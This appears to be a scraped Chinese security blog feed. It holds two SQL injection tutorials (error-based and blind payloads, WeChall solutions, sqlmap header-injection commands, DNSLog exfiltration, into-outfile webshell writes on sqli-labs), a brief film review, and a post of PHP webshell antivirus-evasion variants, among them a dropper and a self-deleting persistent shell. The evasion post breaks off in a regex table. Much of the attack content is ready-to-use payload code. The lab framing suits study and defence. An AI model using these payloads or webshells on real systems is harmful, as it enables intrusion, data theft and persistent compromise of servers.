updatexml()函数的报错就是在第二参数上做文章，这里的concat(0x7e,version(),0x7e)试图通过concat()函数拼接一个字符串，version()函数返回当前数据库的名称。但是0x7e是一个十六进制值，代表的是ASCII字符~，通常不直接用于XPath表达式，这导致二个参数的XPath表达式格式不正确，引发函数报错。\n所以这里只要在concat()函数中构造我们要查询的SQL注入Payload就可以利用：\n爆数据库版本信息：\n1 SELECT updatexml(1,concat(0x7e,@@version,0x7e),1) 爆当前数据库名：\n1 SELECT updatexml(1,concat(0x7e,database(),0x7e),1) 爆当前库中表名：\n1 SELECT updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) 爆表字段信息：\n1 SELECT updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=\u0026#39;数据库名\u0026#39; and table_name=\u0026#39;数据表名\u0026#39;),0x7e),1) 爆字段内容信息：\n1 SELECT updatexml(1,concat(0x7e,(select group_concat(字段名) from 数据库名.数据表名),0x7e),1) 综上，XPath函数报错的本质就是利用updatexml()和concat()两个函数，标准的语句就是\n1 SELECT updatexml(1,concat(0x7e,查询函数1,0x7e,查询函数2,0x7e),1) 其中updatexml()是调用修改xml的功能，参数第一个和第三个随便填个数字（遵循其用法），第二个参数使用concat()函数拼接字符串，concat()的参数根据实际需要填写，个数不限，里面必须要有0x7e引起报错，结合查询参数，比如datebase()查数据库名，select语句(外面要加括号)查更详细内容。\nextractvalue()函数 extractvalue()和updatexml()的用法基本一致，只不过extractvalue()只有两个参数，所以只需要删掉上面示例语句中updatexml()的第三个参数1就可以了。\n例如：\n1 SELECT extractvalue(1,concat(0x7e,@@version,0x7e)) 方法二：count(*) + group by + floor(rand()*2)报错 原理解释（仅作了解） 前置知识： 1. rand(0) 的伪随机特性\nrand(seed) 是 伪随机数生成函数 ，当种子固定为0时，生成的随机数序列是完全固定的 。 在同一个查询中 ，多次调用rand(0)会生成连续的随机数（而非每次重置种子）。 实际测试序列（从种子0开始）： 调用次数 rand(0)返回值 floor(rand(0)*2)结果 第 1 次 0.15522042769493574 0 第 2 次 0.6207181804390444 1 第 3 次 0.6387417590220086 1 第 4 次 0.4010441501938625 0 第 5 次 0.7180266582204114 1 2. GROUP BY 的虚拟表执行流程\nGROUP BY会维护一个虚拟临时表 ，结构为(分组键x, 计数count)，执行逻辑是：\n初始化空虚拟表，分组键是唯一键（不允许重复）。 遍历原表每一行：a. 计算当前行的分组键表达式，得到x1。b. 检查虚拟表是否存在x1： 存在 → 对应行的count加 1。 不存在 → 再次计算分组键表达式 得到x2，然后插入新行(x2, 1)。 遍历结束后返回虚拟表结果。 按步骤还原报错过程： 假设users表有至少 3 行数据 （触发报错的必要条件），我们逐行分析虚拟表的变化：\n初始化状态 ，虚拟表为空：\nx count 空 空 步骤 1：处理第 1 行数据 计算分组键 x1（第 1 次调用rand(0)）：floor(rand(0)*2) → 0。 检查虚拟表 ：没有x=0的行，需要插入新行。 再次计算分组键 x2 （第 2 次调用rand(0)）：floor(rand(0)*2) → 1。 插入虚拟表 ：新增行(1, 1)。 虚拟表现在：\nx count 1 1 步骤 2：处理第 2 行数据 计算分组键 x1 （第 3 次调用rand(0)）：floor(rand(0)*2) → 1。 检查虚拟表 ：存在x=1的行，将count加 1 → count=2。 虚拟表现在：\nx count 1 2 步骤 3：处理第 3 行数据（触发报错‼️） 计算分组键 x1 （第 4 次调用rand(0)）：floor(rand(0)*2) → 0。 检查虚拟表 ：没有x=0的行，需要插入新行。 再次计算分组键 x2 （第 5 次调用rand(0)）：floor(rand(0)*2) → 1。 尝试插入虚拟表 ：新增行(1, 1)，但虚拟表中已存在**x=1**的行（分组键是唯一键）。 报错触发：MySQL 抛出\u0026lt;font style=\u0026quot;color:#DF2A3F;background-color:rgba(0, 0, 0, 0);\u0026quot;\u0026gt;ERROR 1062 (23000): Duplicate entry '1' for key 'group_key'\u0026lt;/font\u0026gt;（重复键错误）。 报错核心原因总结 双重计算分组键 ：GROUP BY在插入新行时会再次计算分组键，导致rand(0)被额外调用一次。 固定序列冲突 ：rand(0)的固定序列使得 “插入时计算的分组键” 与虚拟表中已存在的分组键重复。 唯一键约束 ：虚拟表的分组键是唯一键，重复插入会触发主键冲突错误。 补充：如果users表行数不足 3，可能不会报错（比如仅 2 行时，插入 1 次后后续行直接累加计数，无二次插入）。\n使用方法 示例payload：\n爆当前数据库及表名：\n1 SELECT count(*), concat(0x7e, database(), 0x7e, table_name, 0x7e, floor(rand(0)*2)) AS x FROM information_schema.tables WHERE table_schema = database() GROUP BY x 爆当前表的所有字段名：\n1 SELECT count(*), concat(0x7e, table_name, 0x7e, column_name, 0x7e, floor(rand(0)*2)) AS x FROM information_schema.columns WHERE table_schema = database() AND table_name = \u0026#39;表名\u0026#39; GROUP BY x 爆字段内容信息：\n1 SELECT count(*), concat(0x7e, (SELECT concat(group_concat(字段名1),0x3a, group_concat(字段名2)) FROM 表名), 0x7e, floor(rand(0)*2)) AS x FROM information_schema.tables GROUP BY x 布尔型注入 构造不同的SQL语句，根据页面返回的真假状态（如页面正常显示、报错或空白）来逐位推断数据库信息。\n适合无错误回显但页面有明显差异的场景。\n核心函数 length() - 判断长度 1 SELECT length(database())\t//返回数据库名的字符长度 substr() - 截取字符 1 SELECT substr(database(),1,1)\t//从第一个字符开始截取一位 ascii() - 转ASCII码 1 SELECT ascii(substr(database(),1,1))\t//将字符转为ASCII码值用于比较 💡效率优化： 使用二分法可大幅减少请求次数。ASCII值范围32-126，最多只需7次比较即可确定一个字符。\n注意事项： 布尔型注入请求量大，易被WAF拦截。建议编写自动化脚本或使用SQLMap工具。\n总之，了解原理就行，碰到就用sqlmap，别折磨自己。\nPOST型盲注 之前我们接触的都是通过GET接收信息的类型，\n但还存在通过POST接收信息的，通常存在于登录窗口等页面上\nPOST型盲注有这样几个特点\n参数在请求体中 长度无限制 常用#注释 需抓包工具分析 小测验 第一关 访问[WeChall] Training: MySQL I\n在username一栏尝试闭合，发现admin'没有报错。\n查看源码：\n1 SELECT * FROM users WHERE username=\u0026#39;$username\u0026#39; AND password=\u0026#39;$password\u0026#39; 所以可以用万能钥匙绕过密码检查，username填admin' #即可\n第二关 访问：[WeChall] Training: MySQL II\n同样发现是单引号闭合。\n查看源码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 function auth2_onLogin(WC_Challenge $chall, $username, $password) { $db = auth2_db(); $password = md5($password); $query = \u0026#34;SELECT * FROM users WHERE username=\u0026#39;$username\u0026#39;\u0026#34;; if (false === ($result = $db-\u0026gt;queryFirst($query))) {\t//使用查询语句查询对应的密码 echo GWF_HTML::error(\u0026#39;Auth2\u0026#39;, $chall-\u0026gt;lang(\u0026#39;err_unknown\u0026#39;), false); return false; } ############################# ###\t新\t增\t部\t分 ### if ($result[\u0026#39;password\u0026#39;] !== $password) { echo GWF_HTML::error(\u0026#39;Auth2\u0026#39;, $chall-\u0026gt;lang(\u0026#39;err_password\u0026#39;), false); return false; } #\t新\t增\t部\t分 ### ############################# 发现这次是对用户名和密码单独进行校验，并且发现对密码进行了md5校验，因此唯一可操作的地方就是username，主要思路就是利用union select报错位掩盖真实数据来让程序以为自己查到的数据变成可以由我们指定的数据。\n1 admin\u0026#39; order by 3 后面最大为3时不报错，说明存在3个报错位（也就是users这个表中的字段数）\n根据常识字段大概依次为id,username,password，说明我们应该利用第2，3报错位，\n根据题目要求username填admin，密码因为是md5加密过的，所以我们填\n1 2 用户名\t-admin\u0026#39; union select 1,\u0026#39;admin\u0026#39;,md5(123) # 密码\t123\t不唯一，只要和上面对应就行 前面加-是为了引起报错，从而让后面的union select得以覆盖报错位。此外，使用or 1=2永假条件也可以强制报错。\n第三关 访问：[WeChall] No Escape，我们的任务是修改任意一个候选人的票数为111，且程序提到票数达到100时会重制，所以靠手点肯定是不行的。\n任意点击投票按钮发现网址后会跟着一个参数?vote_for=xxx\n查看源码(核心)：\n1 $query = \u0026#34;UPDATE noescvotes SET `$who`=`$who`+1 WHERE id=1\u0026#34;; 可以看到是传入参数后用uodate函数将对应的值+1\n已知句中第二个$who是我们传入的参数值，现在我们要使用闭合（注意原题使用反引号`闭合）加注释的方法在这一行进行注入。\n上面的划线部分就是我们传入的参数，删除线部分是被注释掉的部分，从整个语句来看，该参数成功做到了将wagenk项对应的值修改为111，并且注释了后面原本的内容。所以此外还要注意POST数据的编码转换，所以最后的payload就是：\n1 ?vote_for=wagenk`=111%20%23 HTTP 头注盲注详解 基本概念 HTTP 头注盲注（HTTP Header Blind SQL Injection）是一种特殊的 SQL 注入攻击，攻击者通过篡改 HTTP 请求头部字段（如 User-Agent、Referer、Cookie、X-Forwarded-For 等），将恶意 SQL 代码注入到后端数据库查询中，同时由于应用程序不返回数据库错误信息或查询结果，只能通过页面响应差异（布尔值）或时间延迟来判断注入结果，从而逐位提取敏感数据的攻击方式。\n漏洞原理 开发者将 HTTP 头信息直接写入数据库（如日志记录功能），未做过滤或转义处理 典型场景：insert into logs(username, ip, useragent) values('admin', '127.0.0.1', 'user-agent内容'); 全局过滤常只针对 GET/POST 参数，忽略 HTTP 头信息，导致绕过防御 常见注入点 HTTP 头中可能存在注入漏洞的字段包括：\n头部字段 常见使用场景 注入风险说明 User-Agent 记录客户端浏览器信息 广泛用于日志，易被忽略过滤 Referer 记录访问来源页面 部分应用会存储该信息用于分析 Cookie 会话管理、用户标识 常包含用户 ID 等关键信息，直接用于查询 X-Forwarded-For 获取客户端真实 IP 反向代理环境下常用，易被直接存入数据库 Host 指定目标服务器域名 部分应用会根据 Host 值生成动态内容 Accept-Language 语言偏好设置 多语言网站可能使用该值查询数据库 使用sqlmap注入 前置准备：抓取目标 HTTP 请求包 sqlmap 处理 HTTP 头注入时，最便捷的方式是先抓取完整的 HTTP 请求包并保存为文本文件（通常命名为request.txt）。\n抓包工具 ：Burp Suite 抓包示例 ： 配置浏览器代理，拦截目标请求； 找到包含目标 HTTP 头（如 User-Agent、Cookie）的请求； 右键选择「Copy to file」保存为request.txt。 request.txt 示例内容 ： 1 2 3 4 5 6 7 GET /log.php HTTP/1.1 Host: target.com User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Referer: https://target.com Cookie: PHPSESSID=abc123 Accept-Language: zh-CN,zh;q=0.9 Connection: close 核心操作步骤 sqlmap 针对 HTTP 头注盲注的核心逻辑是：指定请求文件 → 标记注入点 → 选择盲注类型 → 自动化检测 / 提取数据。\n基础命令（检测 HTTP 头注入漏洞） 指定单个 HTTP 头注入点\n以User-Agent头为例，在请求文件中找到User-Agent行，在需要注入的位置添加*标记注入点，再执行 sqlmap 命令：\n修改后的 request.txt （关键：User-Agent: *）：\n1 2 3 4 5 6 GET /log.php HTTP/1.1 Host: target.com User-Agent: * Referer: https://target.com Cookie: PHPSESSID=abc123 Connection: close 检测命令 ：\n1 2 # -r 指定请求文件，-p 指定注入点（对应*的位置），--risk 2 提高检测强度，--level 3 检测更多HTTP头 sqlmap -r request.txt -p User-Agent --risk 2 --level 3 --batch 针对 Cookie/Referer/X-Forwarded-For 等其他头\n只需将*标记到对应头部字段即可，示例：\nCookie 注入：Cookie: PHPSESSID=* X-Forwarded-For 注入：X-Forwarded-For: * Referer 注入：Referer: * 如果 sqlmap 未自动识别盲注类型，可手动指定布尔盲注（B）或时间盲注（T）：\n布尔盲注（最常用） 1 2 # --technique B 指定布尔盲注，--dbms 指定数据库类型（如MySQL），-v 1 显示基础日志 sqlmap -r request.txt -p User-Agent --technique B --dbms MySQL --batch -v 1 时间盲注（无页面响应差异时） 1 2 # --technique T 指定时间盲注，--delay 2 设置每次请求延迟2秒（避免误判），--time-sec 5 设置sleep时间5秒 sqlmap -r request.txt -p User-Agent --technique T --delay 2 --time-sec 5 --batch 提取数据 确认存在漏洞后，可通过在下面的基础命令上添加之前学习的参数提取数据库、表、字段、数据：\n1 sqlmap -r request.txt -p User-Agent 针对盲注速度慢的问题，可添加以下参数优化：\n1 2 3 # --threads 5 开启5线程（不要太高，避免被拦截），--charset \u0026#34;0-9a-z\u0026#34; 指定字符集缩小猜测范围 # --binary-hex 用16进制提取数据，避免字符编码问题，--smart 智能检测减少无效请求 sqlmap -r request.txt -p User-Agent --technique T --threads 5 --charset \u0026#34;0-9a-z\u0026#34; --binary-hex --smart --batch ","date":"2026-01-22T20:58:00+08:00","permalink":"https://www.retr0.xyz/p/1.22-sql%E6%B3%A8%E5%85%A5%E7%B3%BB%E5%88%97-2/","title":"1.22 SQL注入系列-2"},{"content":"拓展一：DNSLOG 注入 [1] 在很多情况下，特别是登录框，你绞尽脑汁试图传入一些参数让系统返回报错内容供你分析，但很可惜，页面看起来永远也不可能输出错误信息给你了，那现在怎么办？\n有一种神奇的东西叫做 DNSLog平台，你可以在上面申请一个子域名，它可以向DNS询问谁访问过它的这个子域名。\n访问：eye.sh，并申请一个子域名，例如1b9va5vk.eyes.sh\n接下来打开你的cmd ，输入ping nihao.1b9va5vk.eyes.sh，虽然显示拒绝访问，但是实际上你已经向DNS提出了解析申请，所以你现在可以在网站上看到你访问的记录。\n这显然是一个带出数据的好方法，我们只要传入参数，让数据库把我们想要的信息拼接在域名前面并访问，我们就可以在DNSLog上看到记录了。\n示例（查看当前数据库名）：\n1 ?id=1\u0026#39; and (select load_file(concat(\u0026#39;\\\\\\\\\u0026#39;,(select database()),\u0026#39;.域名\\\\a\u0026#39;))) --+ 或者（推荐）\n1 sqli_str.php?name=abc\u0026#39; and if((select load_file(concat(\u0026#39;\\\\\\\\\u0026#39;,(database()),\u0026#39;.域名\\\\xxx\u0026#39;))),1,0) --+\u0026amp;submit=submit 示例（查看当前表名）：\n1 sqli_str.php?name=abc\u0026#39; and if((select load_file(concat(\u0026#39;\\\\\\\\\u0026#39;,(select table_name from information_schema.tables where table_schema=0x70696b61636875 limit 0,1),\u0026#39;.域名\\\\xx1\u0026#39;))),1,0) --+\u0026amp;submit=submit 打开dnslog.py并使用Ctrl+S保存文件为php根据您的实际情况适当修改配置作为虚拟靶场。\n传入上面的参数，查看DNSLog平台，发现记录的域名前确实是当前数据表。\n拓展二：[2] 分析数字型/字符型(单/双引号)注入： 一顿操作发现是((''))闭合\n接下来就是注入了，我们从本关的标题了解到： dump into outfile,意思是本关我们利用文件导入的方式进行注入。（在补充下载源码中我们发现，print_f(mysql_error()) 被注释掉了说明我们不能基于报错来进行注入，但我们可以使用布尔盲注，直接套Less-5的表达式就能得出我们想要的信息，但这不是本关的意图。）\n那么我们使用 导出文件开始注入吧：\n第一种思路： 先导出文件 导出文件就是可以向服务器写入文件，但是利用的时候要知道数据库、网站的路径，但在Less-7下我们无法获取到网站路径，因为它报错不在返回报错的数据库信息，那么怎么办？很简单，在Less 1-6关中是返回报错信息的，那么我们随便挑一关进行报错注入，来获取我们想要的信息，这里以Lese-1为例\n获取网站的绝对路径：(@@datadir获取数据库存储数据路径 ，@@basedir是MySQL获取安装路径)\n?id=-1' union select 1,2,@@datadir --+\n@@datadir返回的是数据库存储数据的路径，而我们知道网站路径是在WWW目录下，那么结合@@datadir我们可以推断出网站的绝对路径为 C:\\phpStudy\\www\\\n（PS：实际上我们要获得一个网站的绝对路径是很困难的）\n读写权限测试： id=1')) and (select count(*) from mysql.user)\u0026gt;0 --+ 如果返回正常则有读取权限\n返回正常，说明具有文件读取权限\n提示：\nMySQL是通过权限表来控制用户对数据库访问的，权限表存放在mysql数据库中，主要的权限表有以下几个：user,db,host,table_priv,columns_priv和procs_priv\n利用into outfile 进行演示： 1 ?id=1\u0026#39;)) union select 1,2,3 into outfile \u0026#34;C:\\\\phpStudy\\\\WWW\\\\sqli\\\\Less-7\\\\test.txt\u0026#34; --+ 虽然显示 sql 报错了，但是没有关系，我们可以在浏览器或后台中看到 test.txt 文件已经生成了\n1 ?id=-1\u0026#39;)) union select 1,2,3 into outfile \u0026#34;C:\\\\phpStudy\\\\WWW\\\\sqli\\\\Less-7\\\\test.txt\u0026#34; --+ （这里用-1还是1，实际上是没多大区别的，因为union是联合查询。）\n注意：\nC:\\\\phpStudy\\\\WWW\\\\sqli\\\\Less-7\\\\是当前关卡的路径，当然如果想直接放在WWW目录下也是一样的：\n提示：\n反斜杠\\是Windows系统文件目录结构使用的分隔符，如：D:\\我的文档。只有 windows 支持反斜杠路径符 \\ ，而所有系统支持 /\n但是我们还应该知道 \\ 也是转义字符，在url中他会当成转义字符处理，所以我们用 \\ 对反斜杠进行转义，那么结果就变成了一个反斜杠。\n4.导入到文件 我们可以直接将一句话木马导入进去（注意：$_POST是php的内置变量，而且php还区分大小写的，所以这里一定要写正确）\n1 id=1\u0026#39;)) union select 1,2,\u0026#39;\u0026lt;?php @eval($_POST[\u0026#34;shell\u0026#34;])?\u0026gt;\u0026#39; into outfile \u0026#34;C:\\\\phpStudy\\\\WWW\\\\sqli\\\\Less-7\\\\test.php\u0026#34; --+ 接下来用菜刀等 webshell 管理工具连接即可.\n第二种思路： 注意：\n对文件进行导入导出首先得要有足够的权限，\n但是mysql默认不能导入和导出文件，这与secure_file_priv的值有关（默认为null)\nsecure-file-priv参数是用来限制LOAD DATA, SELECT … OUTFILE, and LOAD_FILE()传到哪个指定目录的。\n1、当secure_file_priv的值为null ，表示限制mysqld 不允许导入|导出\n2、当secure_file_priv的值为/tmp/ ，表示限制mysqld 的导入|导出只能发生在/tmp/目录下\n3、当secure_file_priv的值没有具体值时，表示不对mysqld 的导入|导出做限制\n用以下命令查看secure_file_priv的值\nshow variables like '%secure%';\n如果是null，想得到导入导出权限，可以在my.ini文件[mysqld]的后面加上secure_file_priv=''（两个英文单引号），然后重启phpstudy即可\n还要注意的是：\n1、outfire 后面的路径为绝对路径且存在\n2、要有足够的权限\n3、注入的内容也可以是字符串，句子\n4、要想注入新内容，需要新的文件名\n这里写入文件的时候，需要注意的是利用数据库file权限向操作系统写入文件时，对于相同文件名的文件不能覆盖，所以如果第一次上传test.php，下次再上传test.php，就是无效命令了，也就是新的test.php中的内容并不会覆盖之前的test.php\n获取字段数： ?id=1')) order by 3 --+\n最大为3时不报错\n导出数据库名 1 id=-1\u0026#39;)) union select 1,user(),database() into outfile \u0026#34;C:\\\\phpStudy\\\\WWW\\\\sqli\\\\Less-7\\\\aaa.txt\u0026#34; --+ 让id=-1是为了让后面的报错位完全覆盖前面的查询数据，我们要的是联合查询union后面查询的数据。\n接着访问生成的txt文件\n导出表名 1 ?id=-1\u0026#39;)) union select 1,2,table_name from information_schema.tables where table_schema=\u0026#39;security\u0026#39; into outfile \u0026#34;C:\\\\phpStudy\\\\WWW\\\\sqli\\\\Less-7\\\\bbb.txt\u0026#34; --+ （注意：这里文件名换了。要想注入新内容，需要新的文件名，接下来相同）\n导出字段名 1 ?id=-1\u0026#39;)) union select 1,2,column_name from information_schema.columns where table_schema=\u0026#39;security\u0026#39; and table_name=\u0026#39;users\u0026#39; into outfile \u0026#34;C:\\\\phpStudy\\\\WWW\\\\sqli\\\\Less-7\\\\ccc.txt\u0026#34; --+ 导出数据 1 ?id=-1\u0026#39;)) union select * from users into outfile \u0026#34;C:\\\\phpStudy\\\\WWW\\\\sqli\\\\Less-7\\\\ddd.txt\u0026#34; --+ 使用菜刀 导入一句话木马：\n1 ?id=1\u0026#39;)) union select 1,2,\u0026#39;\u0026lt;?php @eval($_POST[\u0026#34;mima\u0026#34;])?\u0026gt;\u0026#39; into outfile \u0026#34;C:\\\\phpStudy\\\\WWW\\\\sqli\\\\Less-7\\\\test.php\u0026#34; --+ 接下来的步骤与前面的一样，不再重复了。\n参考文献： [1] 途中风雨. SQL注入（7）之DNSLOG注入 [EB/OL]. 2025-03-13. https://blog.csdn.net/2401_88816569/article/details/146240009.[2026-01-22]\n[2] 小哈小哈喽. Sqli-labs之Less-7 [EB/OL]. 2020-06-04. https://blog.csdn.net/m0_46315342/article/details/106557552.[2026-01-22]\n","date":"2026-01-22T20:57:38+08:00","permalink":"https://www.retr0.xyz/p/1.22.sp-%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7sql%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%95%B0%E6%8D%AE%E5%A4%96%E5%B8%A6/","title":"1.22.SP 奇技淫巧：SQL注入之数据外带"},{"content":"在历史题材扎堆 “厚重感”、喜剧片难逃 “低俗化” 的当下，《长安的荔枝》能达成 “历史 + 喜剧” 的合格融合，已然值得肯定。它与《满江红》共享同一核心逻辑 —— 聚焦小人物的绝境破局：九品小吏李善德带着一本账簿、一身执拗，把 “岭南五千四百里送鲜荔” 的不可能任务，靠死磕与计算硬生生落地，毕竟 “一个人拼尽全力做成一件事，片子就不会太难看”。\n影片的亮点在于古今共振的职场讽刺与情绪共鸣：户部推诿、同僚倾轧的 “踢皮球” 戏码，像极了现代打工人的困境，喜剧外壳下的现实映射让历史不再脱离生活；大鹏塑造的李善德，从为房贷所困到为民生发声，中年人的窘迫与执拗极具感染力，笑点与泪点的平衡也拿捏得当。\n但影片的争议点也正源于其理想化处理：作为封建官场的底层小吏，片尾李善德当众撕碎账簿怒斥杨国忠的 “硬刚”对皇帝乃至整个政权的怀疑，显然脱离了封建体制的现实逻辑 —— 这种明知不可能却被放大的反抗，并未让观影体验更畅快，反而让人心里不是滋味。并非影片拍得不好，而是这种理想与现实的割裂，自带一种让人怅然的酸涩感，少了几分真实的厚重。更突兀的是结尾，安禄山兵变、长安沦陷的情节毫无前期铺垫，硬生生插入主线，既割裂了 “送荔枝” 的核心叙事，又像强行贴上的历史标签，让节奏戛然而止。\n6 分的评分恰如其分：它不算惊艳，但在当下的市场环境中，能把历史讲得有趣、把小人物的坚持拍得动人，已属难得；若能打磨人设逻辑与收尾衔接，本可更进一步。适合抱着轻松心态观影，感受小人物的热血与历史的烟火气。总而言之，可以一看，哪怕只是好奇地看看唐朝时的广州这个鲜有影视作品接触的地方是什么样也是不错的。\n","date":"2026-01-21T23:41:56+08:00","image":"https://free.picui.cn/free/2026/01/21/6970f2f230004.png","permalink":"https://www.retr0.xyz/p/%E5%BD%B1%E8%A7%86%E7%9F%AD%E8%AF%84%E9%95%BF%E5%AE%89%E7%9A%84%E8%8D%94%E6%9E%9D6/10%E7%83%AD%E8%A1%80%E4%B8%8E%E6%80%85%E7%84%B6%E4%BA%A4%E7%BB%87%E7%9A%84%E5%8E%86%E5%8F%B2%E5%96%9C%E5%89%A7%E5%90%88%E6%A0%BC%E4%B9%8B%E4%BD%9C/","title":"[影视短评]《长安的荔枝》6/10：热血与怅然交织的历史喜剧合格之作"},{"content":"使用木马识别网站检验免杀效果：https://www.virustotal.com/gui/\n一句话木马免杀 使用eval方法 1 \u0026lt;?php eval($_POST[\u0026#39;cmd\u0026#39;]);?\u0026gt; 使用assert方法 1 \u0026lt;?php assert($_POST[\u0026#39;cmd\u0026#39;]);?\u0026gt; 写成HTML语言 1 \u0026lt;script language=\u0026#34;php\u0026#34;\u0026gt; eval($_POST[\u0026#39;cmd\u0026#39;]);\u0026lt;/script\u0026gt; call_user_func调用 1 call_user_func(assert,$_POST[\u0026#39;cmd\u0026#39;]); 拆分敏感字符(拆成若干部分) 1 2 $a = substr_replace(\u0026#34;assexx\u0026#34;,\u0026#34;rt\u0026#34;,4); $a($_POST[\u0026#39;cmd\u0026#39;]); 自定义函数 1 2 3 4 5 6 \u0026lt;?php function fun1($a){ $a($_POST[\u0026#39;cmd\u0026#39;]); } fun1(assert); ?\u0026gt; 插入无意义字符 1 2 3 4 5 6 7 \u0026lt;?php $a = $_REQUEST[\u0026#39;cmd\u0026#39;];\t//接收用户通过GET/POST/COOKIE任意方式传入的参数 $b = \u0026#39;\\n\u0026#39;;\t//单引号会原样输出,所以这行作用就是插入无意义内容来混淆 eval($b.=$a);\t//等价于eval($b = $b.$a),php会忽略/n ?\u0026gt; 面向对象 1 2 3 4 5 6 7 8 9 10 11 12 13 14 \u0026lt;?php class me{ public $a = \u0026#39;\u0026#39;; // 定义公共属性$a，初始值为空字符串 function __destruct(){ // 定义析构函数（核心） assert(\u0026#34;$this-\u0026gt;a\u0026#34;); // 析构函数触发时，执行assert，参数是对象属性$a的值 } } $obj = new me; // 实例化me类，创建对象$obj $obj-\u0026gt;a = $_POST[\u0026#39;cmd\u0026#39;]; // 将用户POST传入的cmd参数赋值给对象的$a属性 ?\u0026gt; 加密绕过(base64) 1 2 3 4 5 6 \u0026lt;?php $a = base64_decode(\u0026#34;YXNzZXJ0\u0026#34;); $a($_POST[\u0026#39;cmd\u0026#39;]); ?\u0026gt; 拆碎敏感字符(拆成字母) 1 2 3 4 5 6 7 8 \u0026lt;?php $a = \u0026#34;a\u0026#34;.\u0026#34;s\u0026#34;; $b = \u0026#34;s\u0026#34;.\u0026#34;e\u0026#34;.\u0026#34;r\u0026#34;.\u0026#34;t\u0026#34;; $c = $a.$b; $c($_POST[\u0026#39;cmd\u0026#39;]); ?\u0026gt; 借刀杀人 1 2 3 4 5 6 7 8 9 10 11 12 \u0026lt;?php if(isset($_POST[\u0026#39;file\u0026#39;])){ $d = \u0026#39;data\u0026#39;; $$d = $_POST[\u0026#39;dt\u0026#39;];//$data $f = \u0026#39;fp\u0026#39;; $$f = fopen($_POST[\u0026#39;file\u0026#39;],\u0026#39;wb\u0026#39;);//$fp echo fwrite($fp,$data)?\u0026#39;yes\u0026#39;:\u0026#39;no\u0026#39;; fclose($fp); } ?\u0026gt; 使用方法： POST内容为file=文件名.php\u0026amp;dt=一句话木马,这样本Webshell(表面安全)会在目录下创建一个真木马,从而绕过上传中间的查杀.\n内存马 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 \u0026lt;?php //本程序使用进程运行，进程死了我才死 ignore_user_abort(true); set_time_limit(0); //自杀 unlink(__FILE__); $file = \u0026#39;./.hello.php\u0026#39;; $code = \u0026#39;\u0026lt;?php if(md5($_POST[\u0026#34;pass\u0026#34;])==\u0026#34;202cb962ac59075b964b07152d234b70\u0026#34;){@eval($_POST[\u0026#34;cmd\u0026#34;]);} ?\u0026gt;\u0026#39;; //上面设定了密码防止木马被他人滥用,木马填md5加密后的密文,但传入时传明文 while(1){ file_put_contents($file,$code); usleep(5000); } ?\u0026gt; 使用方法：\n先访问test1.php这时该php会立即自杀，自杀之后会出现.hello.php杀不掉，接着访问.hello.php文件,POST内容pass=密码明文\u0026amp;cmd=命令\n防御方法：\n重启服务 创建新php文件,用ignore_user_abort(true);进行竞争写入 Linux下创建一个名字为.haha.php的文件夹 正则表达式 标准正则表达式 仅供参靠，实战建议交给AI解决！\n功能: 匹配东西，找东西\n正则表达式 准确描述 示例（匹配 / 不匹配说明） \\w 匹配字母（大小写）、数字、下划线，等价于 [A-Za-z0-9_]（非所有字符） 匹配：a、5、_、B；不匹配：@、空格、￥、\\n \\w{3} 匹配连续 3 个字母 / 数字 / 下划线（固定长度） 匹配：abc、89_、X78；不匹配：ab、abcd、a 8（含空格） \\w+ 匹配 1 次或多次字母 / 数字 / 下划线（贪婪匹配，至少 1 个） 匹配：user123、_abc、888；不匹配：空字符串、@123（以特殊字符开头） \\s 匹配空白字符（空格、制表符\\t、换行符\\n、回车符\\r等） 匹配：（空格）、\\t、\\n；不匹配：a、5、@ ^ 锚点，匹配字符串的开头位置（多行模式下匹配每行开头） ^hello：匹配hello world，不匹配world hello $ 锚点，匹配字符串的结尾位置（多行模式下匹配每行结尾） world$：匹配hello world，不匹配world hello \\b\\w{3}\\b \\b是单词边界，匹配 “独立的 3 个字符的单词”（前后为非字母 / 数字 / 下划线） 匹配：abc（单独）、abc 123中的abc；不匹配：abcd中的abc、aabc中的abc \\d 匹配单个数字（0-9），等价于 [0-9] 匹配：0、9；不匹配：a、_、空格 \\d{3}-\\d{7} 匹配 “3 位数字 - 7 位数字” 的格式（典型座机号格式） 匹配：010-1234567、888-9999999；不匹配：01-1234567（位数不足）、010-123456 \\w+@(qq.com竖线gmail.com) 匹配以字母 / 数字 / 下划线开头，@后是qq.com或gmail.com的邮箱 匹配：user123@qq.com、abc_88@gmail.com；不匹配：user@163.com、@qq.com * 匹配前面的表达式 0 次或多次（贪婪匹配） a*：匹配空字符串、a、aaaa；\\d*：匹配空、123 . 匹配除换行符\\n外的任意单个字符 .：匹配a、5、@、空格；不匹配：\\n ? 匹配前面的表达式 0 次或 1 次（非贪婪） a?：匹配空、a；不匹配：aa（仅匹配第一个 a） + 匹配前面的表达式 1 次或多次（贪婪，至少 1 次） a+：匹配a、aaaa；不匹配：空字符串 .* 贪婪匹配：匹配除换行外的任意字符 0 次或多次（尽可能多匹配） a.*b：匹配a123b、a@@@b，若字符串是a1b2b则匹配a1b2b（而非a1b） \\[.*?\\] 非贪婪匹配：匹配[和]之间的任意内容（尽可能少匹配） \\[.*?\\]：字符串[abc][def]中匹配[abc]和[def]（而非整体[abc][def]） \\[label[0-9]\\](.*?)\\[/label[0-9]\\] 匹配[label数字]和[/label数字]之间的内容（非贪婪） 匹配：[label1]test[/label1]中的test；不匹配：[labela]test[/label1]（数字不匹配） .orn 匹配 “任意字符 + orn” 的 4 字符组合 匹配：corn、born、@orn；不匹配：orn（字符不足）、corrn [ab]bcd 匹配以 a 或 b 开头，后接 bcd 的字符串（字符类） 匹配：abcd、bbcd；不匹配：cbcd、abxd [^a]bcd 匹配以 “非 a 字符” 开头，后接 bcd 的字符串（反向字符类） 匹配：bbcd、5bcd、@bcd；不匹配：abcd [f-z]+ 匹配 1 次或多次 f 到 z 的小写字母（字符范围） 匹配：f、xyz、mnop；不匹配：F（大写）、abc、123 [a]?bcd 匹配 “a（可选）+ bcd”，即 bcd 或 abcd 匹配：bcd、abcd；不匹配：aabcd、xbcd [0-3]{3} 匹配连续 3 个 0-3 的数字（固定长度 + 字符范围） 匹配：012、333、201；不匹配：456、01、014 () 分组：将括号内的表达式视为一个整体，可配合量词 